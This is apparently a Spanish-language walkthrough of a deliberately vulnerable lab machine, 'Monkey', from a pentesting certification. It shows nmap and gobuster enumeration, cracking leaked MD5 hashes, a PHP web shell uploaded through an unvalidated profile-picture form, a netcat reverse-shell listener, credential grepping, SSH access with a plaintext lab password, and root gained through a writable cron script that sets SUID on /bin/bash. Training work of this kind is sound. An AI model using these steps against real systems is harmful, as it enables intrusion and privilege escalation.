---
title: Monkey Writeup - Pentester Mentor Junior (PMJ)
date: 2026-08-11
categories:
  - Writeup
  - PMJ
tags:
  - Writeup
  - PMJ
  - Linux
image: /assets/img/commons/MonkeyWriteup/monkey_banner.png
---

En esta ocasión estaré resolviendo la máquina **Monkey**, una máquina Linux de dificultad **Media** perteneciente a la certificación **Pentester Mentor Junior (PMJ)** de la academia **Hacker Mentor**.

El objetivo de este laboratorio es enumerar los servicios expuestos, aprovechar un login FTP anónimo para obtener información sensible, explotar una vulnerabilidad de subida de archivos para lograr ejecución remota de código, y finalmente escalar privilegios hasta convertirme en `root` a través de un cron job mal configurado.

# Reconocimiento

Lo primero que hice fue verificar que la máquina objetivo estuviera activa dentro de la red.

```
ping 192.168.100.89
```

La respuesta confirmó que la máquina se encontraba disponible, así que continué con las siguientes fases.

![ping_maquina](/assets/img/commons/MonkeyWriteup/ping_maquina.png)

La vista de la IP en el navegador seria la siguiente:

![vista_ip_navegador](/assets/img/commons/MonkeyWriteup/vista_ip_navegador.png)

# Escaneo

Lancé un escaneo con `nmap` para identificar los puertos abiertos, los servicios que corren en ellos y sus versiones, además de aprovechar los scripts por defecto para obtener información adicional.

```bash
sudo nmap -sVC -v --min-rate 6000 -p21,22,80 192.168.100.89 -oA ESCANEO
```

Donde:

- `sudo` - Ejecuta Nmap con privilegios de administrador para permitir ciertos tipos de escaneo.
- `-sV` - Detecta las versiones de los servicios encontrados en los puertos abiertos.
- `-C` - Ejecuta los scripts NSE predeterminados para obtener información adicional sobre los servicios.
- `-v` - Muestra información detallada durante el escaneo.
- `--min-rate 6000` - Intenta mantener una tasa mínima de envío de 6000 paquetes por segundo para acelerar el escaneo.
- `-p21,22,80` - Escanea únicamente los puertos TCP mencionados.
- `192.168.100.89` - Es la dirección IP del objetivo que se va a escanear.
- `-oA ESCANEO` - Guarda los resultados en los formatos `.nmap`, `.xml` y `.gnmap`, utilizando `ESCANEO` como nombre base.

![escaneo_puertos](/assets/img/commons/MonkeyWriteup/escaneo_puertos.png)

Los resultados muestran tres servicios abiertos:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.9p1 Debian 10+deb10u2 |
| 80 | HTTP | Apache httpd 2.4.38 (Debian) |

Un detalle interesante que arrojó el script `ftp-anon` es que **el login anónimo está permitido** en el servidor FTP, y además se lista un archivo llamado `notas.txt`. Con esto ya tenía un primer punto de entrada claro: en lugar de lanzar scripts de vulnerabilidades a ciegas, decidí ir directo a revisar ese acceso sin credenciales.

## Enumeración por FTP (Conexión con el usuario anónimo)

```bash
ftp DIRECCION
```

Una vez dentro, listé el contenido del directorio:

```bash
ls -la
dir
```

![coneccion_ftp](/assets/img/commons/MonkeyWriteup/coneccion_ftp.png)

Encontré el archivo `notas.txt`, lo descargué y lo revisé:

```bash
more notas.txt
```

![vista-notas](/assets/img/commons/MonkeyWriteup/vista-notas.png)

El contenido resultó ser una nota interna dejada por un usuario llamado **hmentor**, dirigida al equipo de administración del sitio. En ella se menciona que un usuario llamado **Grimmie** está probando el sitio web de la nueva academia y que **no debe reutilizar la misma contraseña en otros servicios**. También se revela que, como no fue posible crear el usuario desde el panel de administración, se insertó directamente en la base de datos mediante una consulta SQL cruda, la cual queda expuesta en la nota junto con el hash de la contraseña y el nombre de usuario a utilizar para loguearse.

Con esta información obtuve varios hallazgos valiosos:
- Posibles nombres de usuario: `Hacker`, `Grimmie`, `admin`, `hackermentor`, `hmentor`
- Un hash de contraseña en formato MD5 asociado al usuario `hackermentor`

![descubriendo_hash_notas](/assets/img/commons/MonkeyWriteup/descubriendo_hash_notas.png)

Haciendo uso de [CrackStation](https://crackstation.net/) logré descifrar el hash `8d2473d579e5a11924906def258f97a1` que encontré en el archivo, obteniendo la contraseña `junior01`.

# Enumeración (Fuzzing de directorios)

Con el puerto 80 abierto, procedí a enumerar directorios y rutas ocultas dentro del sitio web usando `gobuster`.

```bash
gobuster dir -u http://192.168.100.89 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![primer_fuzzing](/assets/img/commons/MonkeyWriteup/primer_fuzzing.png)

Este primer escaneo me reveló dos rutas de interés:
- `/phpmyadmin`
- `/monkey`

Con estos nuevos directorios en mano, repetí el fuzzing sobre cada uno de ellos para profundizar en la enumeración.

![segundo_fuzzing](/assets/img/commons/MonkeyWriteup/segundo_fuzzing.png)

![tercer_fuzzing](/assets/img/commons/MonkeyWriteup/tercer_fuzzing.png)

Dentro de `/phpmyadmin` encontré una carpeta `/sql`, y dentro de `/monkey` di con `/admin`, `/assets`, `/includes` y `/db`. Al revisar `/db` me topé con un **archivo `.sql` disponible para descarga**, algo que nunca debería estar accesible públicamente.

![descargar_archivo_sql](/assets/img/commons/MonkeyWriteup/descargar_archivo_sql.png)

## Análisis del archivo SQL filtrado

Descargué el archivo y lo abrí:

```bash
cat archivo.sql
```

![analisis_archivo_sql](/assets/img/commons/MonkeyWriteup/analisis_archivo_sql.png)

El archivo correspondía a un volcado de la base de datos `onlinecourse`, específicamente de la tabla `admin`. En él pude ver la estructura de la tabla y una fila insertada con las siguientes credenciales:

- Usuario: `admin`
- Contraseña (hash MD5): `21232f297a57a5a743894a0e4a801fc3`

Volví a usar [CrackStation](https://crackstation.net/) para intentar descifrar el hash `21232f297a57a5a743894a0e4a801fc3`, y el resultado fue la contraseña `admin`.

Probando estas credenciales confirmé que la contraseña del hash funciona para el login de administrador del sitio Monkey, y que la contraseña `junior01` (obtenida en el proceso de enumeración por FTP) funciona para el login de estudiante.

### Login Admin

![login_admin](/assets/img/commons/MonkeyWriteup/login_admin.png)
### Login Student

![login_student](/assets/img/commons/MonkeyWriteup/login_student.png)

# Explotación (Subida de archivo malicioso)

## Identificando el punto de subida

Ya dentro como estudiante, identifiqué una funcionalidad para subir una foto de perfil que **no valida correctamente el tipo de archivo cargado**. Es posible subir imágenes, archivos `.txt` e incluso archivos `.php`.

Para llegar a la ruta donde se almacenan las imágenes, copié el enlace de la imagen de perfil actual y accedí directamente a él:

![identificacion_punto_subida](/assets/img/commons/MonkeyWriteup/identificacion_punto_subida.png)

## Subida de una webshell básica

Preparé un archivo PHP simple para confirmar la ejecución remota de comandos:

```php
<?php
system('ping -c 5 DIRECCION_KALI_ALUMNOS');
?>
```

Lo subí como nueva foto de perfil y me puse en escucha con `tcpdump` para confirmar la ejecución:

```bash
sudo tcpdump -i eth0 icmp -v # Ponerse en escucha
```

Una vez confirmado el ping, amplié la prueba de concepto para poder ejecutar cualquier comando:

```php
<?php
system('id; whoami; ps; ls; pwd');
?>
```

![vista_info](/assets/img/commons/MonkeyWriteup/vista_info.png)

# Obteniendo una shell reversa

Generé un payload de reverse shell en PHP (por ejemplo con [revshells.com](https://www.revshells.com)) y lo envié, poniéndome previamente en escucha:

```bash
nc -lvnp 6464
```

![crear_script_reverse_shell](/assets/img/commons/MonkeyWriteup/crear_script_reverse_shell.png)

![coneccion_shell](/assets/img/commons/MonkeyWriteup/coneccion_shell.png)

# Post-explotación (Búsqueda de credenciales)

Me moví por el código fuente de la aplicación buscando archivos de configuración y contraseñas:

```bash
cd /var/www/html/monkey/
ls
grep -r .config
```

Vi que todos los archivos incluyen `includes/config.php`, así que busqué coincidencias con la palabra `password` para localizar credenciales embebidas en el código:

```bash
grep -r password
```

![grep_password](/assets/img/commons/MonkeyWriteup/grep_password.png)

Revisé directamente el archivo de configuración de la base de datos:

```bash
cd admin/includes
ls
cat config.php
```

![cat_config](/assets/img/commons/MonkeyWriteup/cat_config.png)

Este archivo me reveló las credenciales de conexión a la base de datos MySQL, incluyendo el usuario `hackermentor` y su contraseña en texto plano.

## Movimiento lateral (Acceso por SSH)

Con la contraseña de `hackermentor` obtenida desde el archivo `config.php`, probé el acceso por SSH usando `crackmapexec` para validar las credenciales antes de conectarme:

```bash
crackmapexec ssh 192.168.100.89 -u "hackermentor" -p "M1_P4ssw0rd_segur@"
```

![validar_ssh](/assets/img/commons/MonkeyWriteup/validar_ssh.png)

Con las credenciales confirmadas, inicié sesión por SSH:

```bash
ssh hackermentor@192.168.100.89
```

![enlace_ssh](/assets/img/commons/MonkeyWriteup/enlace_ssh.png)

# Escalada de privilegios

## Revisando el historial y permisos

Una vez dentro como `hackermentor`, revisé el historial de comandos del usuario para buscar pistas dejadas previamente:

```bash
cat .bash_history
```

![cat_bash](/assets/img/commons/MonkeyWriteup/cat_bash.png)

El historial me mostró referencias a un script llamado `backup.sh` y un intento previo de escalar a `root` mediante `su root`.

Busqué binarios con el bit SUID activo y archivos donde tuviera permisos de escritura:

```bash
find / -perm -4000 -type f 2>/dev/null # Ver en dónde tenemos permisos
find / -writable -type f 2>/dev/null   # Ver en dónde puedo escribir
```

![buscar_permisos](/assets/img/commons/MonkeyWriteup/buscar_permisos.png)

## Detectando el cron job

Revisé si había procesos relacionados a tareas programadas (`cron`) ejecutándose:

```bash
ps -eo user,command | grep cron
```

Para observar en tiempo real qué procesos se ejecutan (sin necesidad de refrescar manualmente), utilicé herramientas como **procmon** o **pspy**:

```bash
cd /tmp
cd /dev/shm
wget ENLACE
chmod +x procmon.sh
./procmon.sh
```

O bien, usando `pspy` (descargado desde los releases de GitHub):

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

![descargar_pspy](/assets/img/commons/MonkeyWriteup/descargar_pspy.png)

En la salida pude observar que **root** ejecuta periódicamente, vía `cron`, el script `/home/hackermentor/backup.sh`. Como este script pertenece a mi usuario, todo lo que escribiera dentro de él se ejecutaría con privilegios de `root`.

![ejecutar_pspy](/assets/img/commons/MonkeyWriteup/ejecutar_pspy.png)

## Explotando el cron job

Revisé el contenido actual del script:

```bash
cd /home/hackermentor/
cat backup.sh
```

![cat_backup](/assets/img/commons/MonkeyWriteup/cat_backup.png)

El script realiza un respaldo comprimido del directorio `includes` de la aplicación web y, adicionalmente, asigna el bit SUID al binario `/bin/bash` mediante `chmod +s /bin/bash`. Esto último era justo lo que necesitaba: en cuanto el cron volviera a ejecutar el script, `/bin/bash` quedaría con el bit SUID activo, permitiéndome obtener una shell con privilegios elevados.

![editar_backup](/assets/img/commons/MonkeyWriteup/editar_backup.png)

![verificar_edicion](/assets/img/commons/MonkeyWriteup/verificar_edicion.png)

Esperé a que `cron` volviera a lanzar el script y ejecuté:

```bash
bash -p
whoami
cd /root/
ls
```

![conseguir_ser_root](/assets/img/commons/MonkeyWriteup/conseguir_ser_root.png)

**¡Listo, ya era root!**

# Conclusión

La máquina **Monkey** es un buen ejercicio de encadenamiento de vulnerabilidades típicas de aplicaciones web mal configuradas:

1. Un servicio **FTP con acceso anónimo** filtró información sensible sobre usuarios y una consulta SQL cruda con credenciales.
2. La enumeración web con `gobuster` me permitió descubrir un **archivo `.sql` expuesto públicamente**, revelando el hash de la contraseña de administrador.
3. Una funcionalidad de **subida de imágenes sin validación** me permitió cargar un archivo `.php` y obtener ejecución remota de código como `www-data`.
4. Un archivo de **configuración con credenciales en texto plano** me permitió el acceso a la base de datos y, posteriormente, el movimiento lateral por SSH.
5. Finalmente, un **cron job ejecutado por root sobre un script editable por un usuario sin privilegios** me permitió la escalada completa hasta `root`.

---

Gracias por leer este writeup.